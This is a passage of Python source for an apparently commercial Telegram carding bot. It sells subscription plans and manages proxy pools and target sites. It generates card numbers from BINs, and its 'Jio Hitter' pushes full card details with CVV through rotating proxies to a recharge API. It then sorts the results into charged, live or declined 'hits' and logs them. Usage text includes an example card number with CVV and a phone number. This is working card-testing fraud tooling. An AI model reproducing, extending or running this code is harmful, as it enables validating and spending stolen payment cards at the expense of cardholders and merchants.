        f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {plan_def.get('name', 'Unknown')} ⭐\n"
        f"[⌯] 𝗦𝗼𝘂𝗿𝗰𝗲 ⌁ {p.get('source', 'key').title()} 🔑\n"
        f"[⌯] 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ⌁ {format_expiry(uid)} ⏳"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/plans$'))
async def plans_command(event):
    uid = event.sender_id
    text = pe(
        f"[⌯] 𝗣𝗹𝗮𝗻𝘀 ⌁ 💎\n\n{SEP}\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝘀 ⌁ 𝚄𝚗𝚕𝚒𝚖𝚒𝚝𝚎𝚍 ⌁ ♾️\n{SEP}\n"
        f"[⌯] 𝗧𝗿𝗶𝗮𝗹 ⌁ 𝙵𝚛𝚎𝚎 🎁\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟹 𝙷𝚘𝚞𝚛𝚜 ⏰\n{SEP}\n"
        f"[⌯] 𝗪𝗲𝗲𝗸𝗹𝘆 ⌁ $𝟷𝟶 💰\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟽 𝙳𝚊𝚢𝚜 📅\n{SEP}\n"
        f"[⌯] 𝗕𝗶-𝗪𝗲𝗲𝗸𝗹𝘆 ⌁ $𝟷𝟾 🤑\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟷𝟻 𝙳𝚊𝚢𝚜 📆\n{SEP}\n"
        f"[⌯] 𝗠𝗼𝗻𝘁𝗵𝗹𝘆 ⌁ $𝟹𝟶 👑\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟹𝟶 𝙳𝚊𝚢𝚜 🗓️\n{SEP}\n"
        f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ /redeem KEY 🔑\n"
        f"[⌯] 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 ⌁ @{OWNER_USERNAME} 💬"
    )
    await raw_send(uid, text, rows_plans())


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ BAN/UNBAN/PREMIUM
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/ban\s+'))
async def ban_user_command(event):
    if not is_admin(event.sender_id): return
    try: target = int(event.message.text.split(' ', 1)[1].strip())
    except Exception:
        await event.reply(pe(f"❌ Usage: /ban [user_id]"), parse_mode='html'); return
    ban_user(target)
    await event.reply(pe(f"🚫 Banned <code>{target}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/unban\s+'))
async def unban_user_command(event):
    if not is_admin(event.sender_id): return
    try: target = int(event.message.text.split(' ', 1)[1].strip())
    except Exception:
        await event.reply(pe(f"❌ Usage: /unban [user_id]"), parse_mode='html'); return
    unban_user(target)
    await event.reply(pe(f"✅ Unbanned <code>{target}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/addpremium\s+'))
async def add_premium_command(event):
    if not is_admin(event.sender_id): return
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(pe(f"❌ Usage: /addpremium [user_id] [days]"), parse_mode='html'); return
    try:
        new_id = int(parts[1]); days = float(parts[2]) if len(parts) > 2 else 30
    except Exception:
        await event.reply(pe(f"❌ Invalid"), parse_mode='html'); return
    activate_plan(new_id, "grant", "custom", days, added_by=event.sender_id)
    await event.reply(pe(f"✅ Added <code>{new_id}</code> ⌁ {days}d"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rmpremium\s+'))
async def remove_premium_command(event):
    if not is_admin(event.sender_id): return
    try: rm_id = int(event.message.text.split(' ', 1)[1].strip())
    except Exception:
        await event.reply(pe(f"❌ Usage: /rmpremium [user_id]"), parse_mode='html'); return
    if revoke_plan(rm_id):
        await event.reply(pe(f"✅ Removed <code>{rm_id}</code>"), parse_mode='html')
    else:
        await event.reply(pe(f"❌ Not found"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/users$'))
async def list_users_command(event):
    if not is_admin(event.sender_id): return
    users = load_premium_users()
    if not users:
        await event.reply(pe(f"📋 No Users"), parse_mode='html'); return
    lines = []
    for i, u in enumerate(users[:30]):
        try:
            uid_int = int(u)
            p = get_plan_info(uid_int)
            source = p.get("source", "key") if p else "key"
            exp = format_expiry(uid_int) if p else "—"
            lines.append(f"[⌯] {i+1} ⌁ {u} ⌁ {source} ⌁ {exp}")
        except Exception:
            lines.append(f"[⌯] {i+1} ⌁ {u}")
    more = f"\n...and {len(users)-30} more" if len(users) > 30 else ""
    await event.reply(pe(f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {len(users)} 👥\n{SEP}\n" + "\n".join(lines) + more), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ SITE COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/addsite\s+'))
async def add_site_command(event):
    if not is_admin(event.sender_id): return
    new_site = event.message.text.split(' ', 1)[1].strip()
    if not new_site.startswith('http'):
        await event.reply(pe(f"❌ URL must start with http"), parse_mode='html'); return
    curr = load_sites()
    if new_site in curr:
        await event.reply(pe(f"⚠️ Already exists"), parse_mode='html'); return
    async with aiofiles.open(SITES_FILE, 'a') as f:
        await f.write(f"{new_site}\n")
    await event.reply(pe(f"✅ Added. Total: {len(curr)+1}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rmsite\s+'))
async def remove_site_command(event):
    if not is_admin(event.sender_id): return
    site = event.message.text.split(' ', 1)[1].strip()
    curr = load_sites()
    if site not in curr:
        await event.reply(pe(f"❌ Not found"), parse_mode='html'); return
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in curr:
            if s != site:
                await f.write(f"{s}\n")
    await event.reply(pe(f"✅ Removed"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/sites$'))
async def list_sites_command(event):
    if not is_admin(event.sender_id): return
    sites = load_sites()
    if not sites:
        await event.reply(pe(f"🌐 No Sites"), parse_mode='html'); return
    lines = "\n".join([f"[⌯] {i+1} ⌁ <code>{s}</code>" for i, s in enumerate(sites[:30])])
    more = f"\n...and {len(sites)-30} more" if len(sites) > 30 else ""
    await event.reply(pe(f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(sites)} 🌐\n{SEP}\n{lines}{more}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/checksites$'))
async def check_sites_command(event):
    if not is_admin(event.sender_id): return
    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(pe(f"❌ No sites/proxies"), parse_mode='html'); return
    smsg = await event.reply(pe(f"🔥 Checking {len(sites)} sites..."), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(sites), 10):
        batch = sites[i:i+10]
        results = await asyncio.gather(*[test_site(s, random.choice(proxies)) for s in batch])
        for r in results:
            (alive if r['status'] in ('alive', 'step_error') else dead).append(r['site'])
        await smsg.edit(pe(f"🔥 Checking...\n✅ {len(alive)} · ❌ {len(dead)}"), parse_mode='html')
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in alive:
            await f.write(f"{s}\n")
    await smsg.edit(pe(f"✅ Complete\n✅ Alive: {len(alive)}\n❌ Removed: {len(dead)}"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ PROXY COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    if not is_admin(event.sender_id): return
    content = event.message.text[len('/addproxy'):].strip()
    if not content:
        await event.reply(pe(f"📡 Usage: /addproxy ip:port"), parse_mode='html'); return
    new = [l.strip() for l in content.split('\n') if l.strip()] if '\n' in content else [content.strip()]
    curr = load_proxies()
    added = [p for p in new if p not in curr]
    if not added:
        await event.reply(pe(f"⚠️ All already in pool"), parse_mode='html'); return
    async with aiofiles.open(PROXY_FILE, 'a') as f:
        for p in added:
            await f.write(f"{p}\n")
    await event.reply(pe(f"✅ Added {len(added)}. Total: {len(curr)+len(added)}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def rm_proxy_command(event):
    if not is_admin(event.sender_id): return
    proxy = event.message.text.split(' ', 1)[1].strip()
    curr = load_proxies()
    if proxy not in curr:
        await event.reply(pe(f"❌ Not found"), parse_mode='html'); return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in curr:
            if p != proxy:
                await f.write(f"{p}\n")
    await event.reply(pe(f"✅ Removed"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/proxies$'))
async def list_proxies_command(event):
    if not is_admin(event.sender_id): return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe(f"📡 No Proxies"), parse_mode='html'); return
    lines = "\n".join([f"[⌯] {i+1} ⌁ <code>{p}</code>" for i, p in enumerate(proxies[:20])])
    more = f"\n...and {len(proxies)-20} more" if len(proxies) > 20 else ""
    await event.reply(pe(f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(proxies)} 📡\n{SEP}\n{lines}{more}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/checkproxies$'))
async def check_proxies_command(event):
    if not is_admin(event.sender_id): return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe(f"📡 No Proxies"), parse_mode='html'); return
    smsg = await event.reply(pe(f"🔥 Checking {len(proxies)} proxies..."), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(proxies), 20):
        results = await asyncio.gather(*[test_proxy(p) for p in proxies[i:i+20]])
        for r in results:
            (alive if r['status'] == 'alive' else dead).append(r['proxy'])
        await smsg.edit(pe(f"🔥 Checking...\n✅ {len(alive)} · ❌ {len(dead)}"), parse_mode='html')
        await asyncio.sleep(0.3)
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive:
            await f.write(f"{p}\n")
    await smsg.edit(pe(f"✅ Complete\n✅ Alive: {len(alive)}\n❌ Removed: {len(dead)}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_proxy_command(event):
    if not is_admin(event.sender_id): return
    count = len(load_proxies())
    with open(PROXY_FILE, 'w') as f:
        f.write("")
    await event.reply(pe(f"🗑️ Cleared {count} proxies"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_proxy_command(event):
    if not is_admin(event.sender_id): return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe(f"📡 No Proxies"), parse_mode='html'); return
    filename = f"proxies_{int(time.time())}.txt"
    async with aiofiles.open(filename, 'w') as f:
        for p in proxies:
            await f.write(f"{p}\n")
    await bot.send_file(event.sender_id, filename, caption=pe(f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(proxies)} 📡"), parse_mode='html')
    try: os.remove(filename)
    except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ USER PROXY
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/setproxy'))
async def set_user_proxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ Access Denied"), parse_mode='html'); return
    content = event.message.text[len('/setproxy'):].strip()
    if not content:
        await event.reply(pe(f"🔌 Formats:\nip:port\nip:port:user:pass\nhttp://user:pass@ip:port\nsocks5://user:pass@ip:port"), parse_mode='html'); return
    proxies = [l.strip() for l in content.split('\n') if l.strip()] if '\n' in content else [content.strip()]
    set_user_proxies(uid, proxies)
    await event.reply(pe(f"✅ Proxy Set\nCount: {len(proxies)}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/clearuserproxy$'))
async def clear_user_proxy(event):
    remove_user_proxy(event.sender_id)
    await event.reply(pe(f"✅ Proxy Cleared"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/chkproxy'))
async def check_user_proxy(event):
    uid = event.sender_id
    user_list = get_user_proxy_list(uid)
    if not user_list:
        await event.reply(pe(f"❌ No proxy set"), parse_mode='html'); return
    smsg = await event.reply(pe(f"⏳ Testing..."), parse_mode='html')
    result = await test_proxy(user_list[0])
    if result['status'] == 'alive':
        ip = await get_proxy_ip(user_list[0])
        await smsg.edit(pe(f"✅ Alive\nIP: {ip or 'N/A'}"), parse_mode='html')
    else:
        await smsg.edit(pe(f"❌ Dead"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ MISC USER COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/genbin\s+'))
async def gen_bin_command(event):
    uid = event.sender_id
    if not is_premium(uid): return
    parts = event.message.text.split()
    if len(parts) < 3:
        await event.reply(pe(f"🎴 Usage: /genbin [BIN] [count]"), parse_mode='html'); return
    bin_prefix = parts[1]
    try: count = int(parts[2])
    except Exception: count = 10
    count = min(max(count, 1), 100)
    cards = generate_cards_from_bin(bin_prefix, count)
    if not cards:
        await event.reply(pe(f"❌ Invalid BIN"), parse_mode='html'); return
    filename = f"gen_{bin_prefix}_{int(time.time())}.txt"
    async with aiofiles.open(filename, 'w') as f:
        for card in cards:
            await f.write(f"{card}\n")
    await bot.send_file(event.sender_id, filename, caption=pe(f"🎴 {len(cards)} cards"), parse_mode='html')
    try: os.remove(filename)
    except Exception: pass


@bot.on(events.NewMessage(pattern=r'^/bin\s+'))
async def bin_lookup(event):
    uid = event.sender_id
    if not is_premium(uid): return
    bin_prefix = event.message.text.split(' ', 1)[1].strip()
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        await event.reply(pe(f"❌ Invalid BIN"), parse_mode='html'); return
    bin_info = await get_bin_info(bin_prefix)
    brand, btype, level, bank, country, flag = bin_info
    await event.reply(pe(
        f"[⌯] 𝗕𝗜𝗡 ⌁ <code>{bin_prefix}</code> 🔍\n{SEP}\n"
        f"[⌯] 𝗕𝗿𝗮𝗻𝗱 ⌁ {brand}\n"
        f"[⌯] 𝗧𝘆𝗽𝗲 ⌁ {btype}\n"
        f"[⌯] 𝗟𝗲𝘃𝗲𝗹 ⌁ {level}\n"
        f"[⌯] 𝗕𝗮𝗻𝗸 ⌁ {bank}\n"
        f"[⌯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country} {flag}"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/split\s+'))
async def split_file_command(event):
    uid = event.sender_id
    if not is_premium(uid) or not event.reply_to_msg_id: return
    parts = event.message.text.split()
    try: split_count = int(parts[1]) if len(parts) > 1 else 50
    except Exception: split_count = 50
    reply = await event.get_reply_message()
    if not reply.file:
        await event.reply(pe(f"❌ Reply to a file."), parse_mode='html'); return
    import tempfile, uuid as _uuid
    _tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
    os.makedirs(_tmp_dir, exist_ok=True)
    _tmp_path = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
    fp = await reply.download_media(file=_tmp_path)
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try: os.remove(fp)
    except Exception: pass
    lines = [l.strip() for l in content.splitlines() if l.strip()]
    if not lines: return
    chunks = [lines[i:i+split_count] for i in range(0, len(lines), split_count)]
    for idx, chunk in enumerate(chunks):
        filename = f"split_{idx+1}_of_{len(chunks)}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for line in chunk:
                await f.write(f"{line}\n")
        await bot.send_file(event.sender_id, filename,
                            caption=pe(f"📂 {idx+1}/{len(chunks)} · {len(chunk)} lines"), parse_mode='html')
        try: os.remove(filename)
        except Exception: pass


@bot.on(events.NewMessage(pattern=r'^/setlog\s+'))
async def set_log_command(event):
    if not is_admin(event.sender_id): return
    try: group_id = int(event.message.text.split(' ', 1)[1].strip())
    except Exception:
        await event.reply(pe(f"❌ Usage: /setlog [group_id]"), parse_mode='html'); return
    set_log_group(group_id)
    await event.reply(pe(f"✅ Log Group Set\n<code>{group_id}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/checklog$'))
async def check_log_command(event):
    if not is_admin(event.sender_id): return
    log_group = load_log_group()
    await event.reply(pe(f"📢 Log Group\n{log_group or 'Not Set'}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/setlimit\s+'))
async def set_limit_command(event):
    if not is_admin(event.sender_id): return
    parts = event.message.text.split()
    if len(parts) < 3: return
    try: target = int(parts[1]); limit = int(parts[2])
    except Exception: return
    set_user_limit(target, limit)
    await event.reply(pe(f"✅ Limit Set\n<code>{target}</code> → {limit}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/stats$'))
async def stats_command(event):
    if not is_admin(event.sender_id): return
    stats = load_stats()
    await event.reply(pe(
        f"[⌯] 𝗦𝘁𝗮𝘁𝘀 📊\n{SEP}\n"
        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝘀 ⌁ {stats.get('total_checks', 0):,}\n"
        f"[⌯] 𝗛𝗶𝘁𝘀 ⌁ {stats.get('total_hits', 0):,}\n"
        f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {len(load_premium_users())}\n"
        f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(load_sites())}\n"
        f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {len(load_proxies())}"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
async def broadcast_command(event):
    if not is_admin(event.sender_id): return
    msg_text = event.message.text.split(' ', 1)[1].strip()
    all_targets = set()
    for u in load_premium_users():
        try: all_targets.add(int(u))
        except Exception: pass
    for u in ADMIN_IDS:
        all_targets.add(u)
    if not all_targets: return
    status_msg = await event.reply(pe(f"📢 Broadcasting to {len(all_targets)}..."), parse_mode='html')
    sent = 0; failed = 0
    for target in all_targets:
        try:
            await bot.send_message(target, pe(f"[⌯] 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 ⌁ SRK™\n{SEP}\n{msg_text}"), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.1)
        except Exception:
            failed += 1
    await status_msg.edit(pe(f"[⌯] 𝗗𝗼𝗻𝗲 ✅\n{SEP}\nSent: {sent}\nFailed: {failed}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/restart$'))
async def restart_command(event):
    if not is_admin(event.sender_id): return
    await event.reply(pe("🔄 Restarting..."))
    await asyncio.sleep(1)
    os.execl(sys.executable, sys.executable, *sys.argv)


@bot.on(events.NewMessage(pattern=r'^/keys$'))
async def view_keys_command(event):
    if not is_admin(event.sender_id): return
    keys = load_keys()
    if not keys:
        await event.reply(pe(f"🔑 No Keys"), parse_mode='html'); return
    lines = []
    for i, (k, v) in enumerate(list(keys.items())[:20]):
        plan = v.get("plan", "weekly")
        used = "USED" if v.get("redeemed_by") else "NEW"
        lines.append(f"[⌯] {i+1} ⌁ <code>{k}</code> ⌁ {plan} ⌁ {used}")
    more = f"\n...and {len(keys)-20} more" if len(keys) > 20 else ""
    await event.reply(pe(f"[⌯] 𝗞𝗲𝘆𝘀 ⌁ {len(keys)} 🔑\n{SEP}\n" + "\n".join(lines) + more), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/clearallkeys$'))
async def clear_all_keys_command(event):
    if not is_admin(event.sender_id): return
    count = clear_keys()
    await event.reply(pe(f"🗑️ Cleared {count} keys"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ JIO HITTER — fixed classification
# ══════════════════════════════════════════════════════════════════════════════
def _jio_classify(data: dict) -> tuple:
    """Returns (status, message, hit_type)."""
    if not isinstance(data, dict):
        return "error", "Invalid API response", None

    ok = data.get("ok")
    stage = str(data.get("stage") or "").strip().lower()
    user_msg = str(data.get("user_message") or "").strip()
    err = str(data.get("error") or "").strip()
    payload = data.get("payload") or {}
    if not isinstance(payload, dict): payload = {}

    blob = f"{user_msg} | {err} | {payload.get('message','')} | {payload.get('status','')}"
    blob_l = blob.lower()

    if ok is True or payload.get("status") is True or payload.get("success") is True:
        msg = user_msg or payload.get("message") or "Recharge successful"
        if "insufficient" in blob_l:
            return "live", msg, "Live"
        return "charged", msg, "Charged"

    if "proxy" in blob_l and any(x in blob_l for x in (
        "dead", "failed to reach", "couldn't connect", "timeout", "connection"
    )):
        return "proxy_error", user_msg or err or "Proxy dead", None

    processor_markers = (
        "failed transaction with processor", "processor declined", "processor error",
        "gateway error", "gateway declined", "acquirer", "issuer unavailable",
        "system error", "service unavailable", "internal error",
        "try again later", "transaction failed",
    )
    if any(x in blob_l for x in processor_markers):
        return "processor_error", user_msg or err or "Processor error", None

    if any(x in blob_l for x in (
        "3d secure", "3ds", "otp", "authentication required",
        "requires_action", "challenge",
    )):
        return "3ds", user_msg or err or "3DS Required", "3DS"

    if any(x in blob_l for x in (
        "insufficient", "not enough funds", "low balance",
        "insufficient_funds", "not sufficient",
    )):
        return "live", user_msg or err or "Insufficient Funds", "Live"

    if any(x in blob_l for x in (
        "decline", "declined", "do not honor", "rejected",
        "invalid card", "expired", "incorrect cvc", "incorrect number",
        "card not supported", "not permitted", "restricted card",
        "invalid_cvv", "invalid_expiry",
    )):
        return "declined", user_msg or err or "Card Declined", None

    if any(x in blob_l for x in (
        "invalid number", "invalid mobile", "operator not found",
        "invalid operator", "number not found",
    )):
        return "invalid", user_msg or err or "Invalid number", None

    if stage == "ccdc_confirm" and err:
        return "declined", err, None
    if stage == "api" and err:
        return "error", err, None
    return "error", user_msg or err or "Unknown response", None


def _jio_pick_proxy(proxies: list) -> str:
    p = random.choice(proxies).strip()
    for prefix in ('http://', 'https://', 'socks4://', 'socks5://'):
        if p.startswith(prefix):
            p = p[len(prefix):]
            break
    if '@' in p:
        creds, hostport = p.rsplit('@', 1)
        if ':' in creds:
            user, pw = creds.split(':', 1)
            return f"{hostport}:{user}:{pw}"
        return hostport
    return p


@bot.on(events.CallbackQuery(pattern=b"jio_info"))
async def jio_info_cb(event):
    uid = event.sender_id
    if not is_premium(uid) and not is_admin(uid):
        await event.answer("❌ Premium required!", alert=True); return
    await event.answer()
    text = pe(
        f"[⌯] 𝗝𝗶𝗼 𝗛𝗶𝘁𝘁𝗲𝗿 ⌁ 📱\n{SEP}\n"
        f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /jio number amount card|mm|yy|cvv\n"
        f"{SEP}\n"
        f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁\n"
        f"<code>/jio 9226217275 19 5131626819112270|09|2026|885</code>\n\n"
        f"{SEP}\n\n"
        f"[⌯] 𝗪𝗵𝗼𝗽 𝗛𝗶𝘁𝘁𝗲𝗿 ⌁ 📱\n{SEP}\n"
        f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /whop [url] card|mm|yy|cvv\n"
        f"{SEP}\n"
        f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁\n"
        f"<code>/whop https://whop.com/muthi-maar/lola-lelo 5131626819112270|09|2026|885</code>"
    )
    try:
        await nav_edit(event.chat_id, event.message_id, text, rows_main())
    except Exception:
        await raw_send(uid, text, rows_main())


@bot.on(events.NewMessage(pattern=r'^/jio(?:\s+(.+))?$'))
async def jio_cmd(event):
    if await _maint_guard(event, "jio"): return
    uid = event.sender_id
    if is_banned(uid): return
    if not is_premium(uid) and not is_admin(uid):
        await event.reply(pe(f"❌ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱"), parse_mode='html'); return
    if await _guard_force_join(event):
        return
    body = (event.pattern_match.group(1) or "").strip()
    if not body:
        await event.reply(pe(
            f"[⌯] 𝗝𝗶𝗼 𝗛𝗶𝘁𝘁𝗲𝗿 ⌁ 📱\n{SEP}\n"
            f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /jio number amount card|mm|yy|cvv\n"
            f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ /jio 9226217275 19 5131626819112270|09|2026|885"
        ), parse_mode='html'); return
    parts = body.split()
    if len(parts) < 3:
        await event.reply(pe(f"❌ 𝗨𝘀𝗮𝗴𝗲 ⌁ /jio number amount card|mm|yy|cvv"), parse_mode='html'); return
    number = parts[0].strip()
    amount = parts[1].strip()
    card_raw = " ".join(parts[2:]).strip()
    cards = extract_cc(card_raw)
    if not cards:
        if "|" in card_raw: cards = [card_raw.replace(" ", "")]
        else:
            await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱"), parse_mode='html'); return
    card = cards[0]
    if not number.isdigit() or len(number) < 10:
        await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿"), parse_mode='html'); return
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not proxies:
        await event.reply(pe(f"❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝘆"), parse_mode='html'); return

    smsg = await event.reply(pe(
        f"[⌯] 𝗝𝗶𝗼 𝗥𝗲𝗰𝗵𝗮𝗿𝗴𝗲 ⌁ 📱\n{SEP}\n"
        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{number}</code> 📞\n"
        f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ <code>₹{amount}</code> 💰\n"
        f"[⌯] 𝗖𝗮𝗿𝗱 ⌁ <tg-spoiler><code>{card}</code></tg-spoiler> 💳\n{SEP}\n"
        f"⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴..."
    ), parse_mode='html')

    url = JIO_API.rstrip("/")
    timeout = aiohttp.ClientTimeout(total=90)
    conn = aiohttp.TCPConnector(ssl=False)
    t0 = time.time()
    result_data = None
    last_error = None

    for attempt in range(3):
        proxy_param = _jio_pick_proxy(proxies)
        params = {"number": number, "amount": amount, "card": card, "proxy": proxy_param}
        try:
            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
                async with s.get(url, params=params) as r:
                    try: data = await r.json()
                    except Exception: data = {"_raw": await r.text(), "error": "Invalid JSON"}
                    if isinstance(data, dict):
                        _e = str(data.get("error") or "").lower()
                        _u = str(data.get("user_message") or "").lower()
                        if "proxy" in _e and any(x in _e for x in ("dead", "failed")):
                            last_error = _e; continue
                        if "proxy" in _u and any(x in _u for x in ("dead", "failed")):
                            last_error = _u; continue
                    result_data = data; break
        except asyncio.TimeoutError:
            last_error = "timeout"; continue
        except Exception as e:
            last_error = str(e); continue

    elapsed = round(time.time() - t0, 2)
    if result_data is None:
        await smsg.edit(pe(f"❌ 𝗝𝗶𝗼 𝗘𝗿𝗿𝗼𝗿 ⌁ ⚠️\n{SEP}\n[⌯] 𝗟𝗮𝘀𝘁 𝗲𝗿𝗿𝗼𝗿 ⌁ {str(last_error)[:100]}"), parse_mode='html')
        return

    status, msg, hit_type = _jio_classify(result_data)
    try:
        bin_info = await get_bin_info(card.split("|")[0])
        brand, btype, level, bank, country, flag = bin_info
    except Exception:
        brand, btype, level, bank, country, flag = "-", "-", "-", "-", "-", ""
    try:
        name, username = await get_user_info(uid)
        cname = name if username else str(uid)
    except Exception:
        cname = str(uid)

    if hit_type:
        fake_result = {
            "card": card, "status": hit_type, "message": msg,
            "gateway": "Jio Recharge", "price": f"{amount} INR", "time": elapsed,
            "bin_info": bin_info,
        }
        await send_realtime_hit(uid, fake_result, hit_type, f"Jio {number}")
        try: await send_hit_log_gc(fake_result, hit_type, uid)
        except Exception: pass
        try: await smsg.delete()
        except Exception: pass
        return

    status_display = {
        "declined": "𝙲𝙰𝚁𝙳 𝙳𝙴𝙲𝙻𝙸𝙽𝙴𝙳",
        "processor_error": "𝙿𝚁𝙾𝙲𝙴𝚂𝚂𝙾𝚁 𝙴𝚁𝚁𝙾𝚁",
        "proxy_error": "𝙿𝚁𝙾𝚇𝚈 𝙴𝚁𝚁𝙾𝚁",
        "invalid": "𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁",
        "error": "𝙴𝚁𝚁𝙾𝚁",
    }.get(status, "𝙵𝙰𝙸𝙻𝙴𝙳")
    head = {
        "declined": "[⌯] 𝗝𝗶𝗼 ⌁ 𝗖𝗮𝗿𝗱 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ ❌",
        "processor_error": "[⌯] 𝗝𝗶𝗼 ⌁ 𝗖𝗮𝗿𝗱 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ ❌",
        "proxy_error": "[⌯] 𝗝𝗶𝗼 ⌁ 𝗣𝗿𝗼𝘅𝘆 𝗘𝗿𝗿𝗼𝗿 ⌁ 📡",
        "invalid": "[⌯] 𝗝𝗶𝗼 ⌁ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ ⚠️",
        "error": "[⌯] 𝗝𝗶𝗼 ⌁ 𝗘𝗿𝗿𝗼𝗿 ⌁ ⚠️",
    }.get(status, "[⌯] 𝗝𝗶𝗼 ⌁ 𝗙𝗮𝗶𝗹𝗲𝗱 ⌁ ❌")

    _msg_display = (msg or "(empty)")[:150]
    out = pe(
        f"{head}\n{SEP}\n"
        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{number}</code> 📞\n"
        f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ <code>₹{amount}</code> 💰\n"
